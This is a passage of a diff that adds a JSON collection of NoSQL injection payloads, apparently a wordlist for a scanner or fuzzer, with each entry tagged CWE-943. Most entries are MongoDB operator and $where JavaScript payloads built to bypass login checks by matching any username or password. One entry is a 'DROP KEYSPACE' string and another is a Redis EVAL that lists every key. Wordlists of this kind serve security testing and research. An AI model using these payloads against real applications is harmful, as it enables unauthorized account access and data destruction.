+      "vector": "{\"username\": {\"$eq\": \"admin\"}, \"password\": {\"$exists\": true}}",
+      "description": "Imported from the legacy corpus (operator_json).",
+      "context": "operator_json",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.cb1795e677",
+      "vector": "{\"isActive\": {\"$ne\": false}}",
+      "description": "Imported from the legacy corpus (operator_json).",
+      "context": "operator_json",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.cea39cca2f",
+      "vector": "{\"username\": {\"$regex\": \".{1,}\"}}",
+      "description": "Imported from the legacy corpus (operator_json).",
+      "context": "operator_json",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.ced9333a6b",
+      "vector": "{\"username\": {\"$eq\": \"admin\"}, \"password\": {\"$exists\": false}}",
+      "description": "Imported from the legacy corpus (operator_json).",
+      "context": "operator_json",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.cfc44453c3",
+      "vector": "{\"$where\": \"function() { return this.username == 'admin' && this.password == 'admin' && this.permissions.read == true; }\"}",
+      "description": "Imported from the legacy corpus (where_js).",
+      "context": "where_js",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.cfd594c02e",
+      "vector": "{\"username\": {\"$regex\": \".*\"}, \"password\": {\"$regex\": \".*\"}}",
+      "description": "Imported from the legacy corpus (operator_json).",
+      "context": "operator_json",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.d0ea42af65",
+      "vector": "{\"$where\": \"this.username == 'admin' && this.password == 'admin'\"}",
+      "description": "Imported from the legacy corpus (where_js).",
+      "context": "where_js",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.d676cb173b",
+      "vector": "{\"username\": {\"$in\": [\"admin\", \"administrator\", \"root\"]}, \"password\": {\"$ne\": \"\"}}",
+      "description": "Imported from the legacy corpus (operator_json).",
+      "context": "operator_json",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.d7b0929e2b",
+      "vector": "{\"$where\": \"function() { return this.username == 'admin' && this.password == 'admin' && this.isQA == true; }\"}",
+      "description": "Imported from the legacy corpus (where_js).",
+      "context": "where_js",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.d8f8a7c602",
+      "vector": "{\"$where\": \"function() { return this.username == 'admin' && this.password == 'admin' && this.isWhitelisted == true; }\"}",
+      "description": "Imported from the legacy corpus (where_js).",
+      "context": "where_js",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.d92024e5b7",
+      "vector": "{\"username\": {\"$eq\": \"admin\"}, \"password\": {\"$in\": [\"admin\", \"administrator\", \"root\"]}}",
+      "description": "Imported from the legacy corpus (operator_json).",
+      "context": "operator_json",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.d96a064a17",
+      "vector": "{\"$where\": \"function() { return this.username == 'admin' && this.password == 'admin' && this.twoFactorEnabled == false; }\"}",
+      "description": "Imported from the legacy corpus (where_js).",
+      "context": "where_js",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.da4cc0f960",
+      "vector": "{\"$where\": \"function() { return this.username == 'admin' && this.password == 'admin' && this.isFinance == true; }\"}",
+      "description": "Imported from the legacy corpus (where_js).",
+      "context": "where_js",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.daa8988b33",
+      "vector": "{\"$where\": \"this.username.length > 0 && this.password.length > 0\"}",
+      "description": "Imported from the legacy corpus (where_js).",
+      "context": "where_js",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.db68486afe",
+      "vector": "'; DROP KEYSPACE test; --",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.db96263c8e",
+      "vector": "{\"username\": {\"$regex\": \".*\", \"$options\": \"i\"}}",
+      "description": "Imported from the legacy corpus (operator_json).",
+      "context": "operator_json",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.dd523692a3",
+      "vector": "{\"username\": {\"$eq\": \"admin\"}, \"$comment\": \"injection\"}",
+      "description": "Imported from the legacy corpus (operator_json).",
+      "context": "operator_json",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.dd96f9cbb9",
+      "vector": "{\"$where\": \"function() { return this.username == 'admin' && this.password == 'admin' && this.isFlagged == false; }\"}",
+      "description": "Imported from the legacy corpus (where_js).",
+      "context": "where_js",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.dfc4952b67",
+      "vector": "{\"$where\": \"function() { return this.username == 'admin' && this.password == 'admin' && this.accountLocked == false; }\"}",
+      "description": "Imported from the legacy corpus (where_js).",
+      "context": "where_js",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.e04d58b0a2",
+      "vector": "{\"$where\": \"function() { return this.username == 'admin' && this.password == 'admin' && this.isCompliance == true; }\"}",
+      "description": "Imported from the legacy corpus (where_js).",
+      "context": "where_js",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.e1f8ae9b57",
+      "vector": "username[$ne]=null&password[$ne]=null",
+      "description": "Imported from the legacy corpus (operator_query_string).",
+      "context": "operator_query_string",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.e206d1d17c",
+      "vector": "{\"username\": {\"$bitsAllClear\": [1, 5]}}",
+      "description": "Imported from the legacy corpus (operator_json).",
+      "context": "operator_json",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.e4969b1856",
+      "vector": "{\"username\": {\"$eq\": \"admin\"}, \"password\": {\"$ne\": \"admin\"}}",
+      "description": "Imported from the legacy corpus (operator_json).",
+      "context": "operator_json",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.e984083491",
+      "vector": "{\"field\": {\"$lte\": \"z\"}}",
+      "description": "Imported from the legacy corpus (operator_json).",
+      "context": "operator_json",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.e9860ce7a3",
+      "vector": "{\"$expr\": {\"$gt\": [\"$price\", 100]}}",
+      "description": "Imported from the legacy corpus (operator_json).",
+      "context": "operator_json",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.e9ae873e3a",
+      "vector": "{\"username\": {\"$nin\": []}}",
+      "description": "Imported from the legacy corpus (operator_json).",
+      "context": "operator_json",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.ed1dca9cc1",
+      "vector": "{\"$where\": \"this.password.match(/.*/)\"}",
+      "description": "Imported from the legacy corpus (where_js).",
+      "context": "where_js",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.eff2b50caf",
+      "vector": "email[$regex]=@.*",
+      "description": "Imported from the legacy corpus (operator_query_string).",
+      "context": "operator_query_string",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.f1d25549e6",
+      "vector": "{\"$gt\": 0}",
+      "description": "Imported from the legacy corpus (operator_json).",
+      "context": "operator_json",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.f227a59d59",
+      "vector": "{\"username\": {\"$regex\": \"(?i)admin\"}}",
+      "description": "Imported from the legacy corpus (operator_json).",
+      "context": "operator_json",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.f3547f8cb2",
+      "vector": "{\"permissions.delete\": true}",
+      "description": "Imported from the legacy corpus (operator_json).",
+      "context": "operator_json",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.f3e7eb4a61",
+      "vector": "{\"$where\": \"function() { return this.username == 'admin' && this.password == 'admin' && this.isAnonymous == false; }\"}",
+      "description": "Imported from the legacy corpus (where_js).",
+      "context": "where_js",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.f5a743ea06",
+      "vector": "EVAL \"return redis.call('keys','*')\" 0",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "generic",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.f769e46156",
+      "vector": "{\"$where\": \"function() { return this.username == 'admin' && this.password == 'admin' && this.permissions.write == true; }\"}",
+      "description": "Imported from the legacy corpus (where_js).",
+      "context": "where_js",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.f7878bdcab",
+      "vector": "{\"username\": {\"$nin\": [null, \"\"]}}",
+      "description": "Imported from the legacy corpus (operator_json).",
+      "context": "operator_json",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.f7aff6c22f",
+      "vector": "{\"$where\": \"function() { return this.username == 'admin' && this.password == 'admin' && this.isAdmin != false; }\"}",
+      "description": "Imported from the legacy corpus (where_js).",
+      "context": "where_js",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.f9217e0f74",
+      "vector": "{\"$where\": \"function() { return this.username == 'admin' && this.password != 'admin'; }\"}",
+      "description": "Imported from the legacy corpus (where_js).",
+      "context": "where_js",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.f9b9464042",
+      "vector": "{\"$where\": \"function() { return this.username == 'admin' && this.password == 'admin' && this.isConfirmed == true; }\"}",
+      "description": "Imported from the legacy corpus (where_js).",
+      "context": "where_js",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.fc0535d458",
+      "vector": "{\"$and\": [{\"username\": {\"$ne\": null}}, {\"password\": {\"$ne\": null}}]}",
+      "description": "Imported from the legacy corpus (operator_json).",
+      "context": "operator_json",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "nosql_injection.legacy.fdb1c59a73",
+      "vector": "password[$ne]=invalid",
+      "description": "Imported from the legacy corpus (operator_query_string).",
+      "context": "operator_query_string",
+      "cwe": "CWE-943",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ]
+    }
+  ]
+}
